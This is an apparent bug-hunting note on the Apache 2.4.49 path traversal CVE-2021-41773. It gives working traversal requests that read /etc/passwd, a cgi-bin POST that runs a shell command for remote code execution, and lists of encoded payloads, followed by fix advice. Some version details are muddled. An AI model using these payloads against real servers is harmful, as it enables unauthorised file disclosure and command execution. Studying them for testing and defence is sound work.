---
name: path-traversal-apache-41773
description: Path traversal + file disclosure in Apache HTTP Server 2.4.49 (CVE-2021-41773) via encoded dot sequences. Teaches encoded path-traversal payloads and RCE escalation.
sources: hackerone_public
report_count: 1
---

# Path Traversal in Apache HTTP Server (CVE-2021-41773)

**Report**: Internet Bug Bounty — "Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49" (hackerone.com/reports/1394916, critical, $4,000).

## Why it matters (the new lesson)
A single change to a path-normalization function in Apache 2.4.49 (fixing CVE-2021-41773's `.` handling) introduced a bypass: URL-encoded `.%2e/` and `%2e%2e/` sequences bypassed the check. This is the canonical lesson in **encoded path traversal** — the same payload works, with different encodings, against many apps' path filters.

## How it works
```
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```
If `mod_cgi` is enabled, a 2.4.50+ variant escalates to RCE via `POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` with body `echo; id`.

## How to hunt for it
1. Fingerprint server version (`Server` header, `curl -I`).
2. Fuzz encoded sequences: `..%2f`, `.%2e/`, `%2e%2e/`, double-encoding `%252e%252e`, unicode `..%c0%af`, backslash `..\\`.
3. Confirm with a known file (`/etc/passwd`, `/windows/win.ini`).

## Payloads
```
/../etc/passwd
/%2e%2e/%2e%2e/etc/passwd
/..%2f..%2f..%2fetc/passwd
/%252e%252e/%252e%252e/etc/passwd
/..%c0%af..%c0%af/etc/passwd
```

## Fix
Use a well-tested path normalization library; upgrade; normalize then verify canonical path stays within root; block encoded dot-segments.
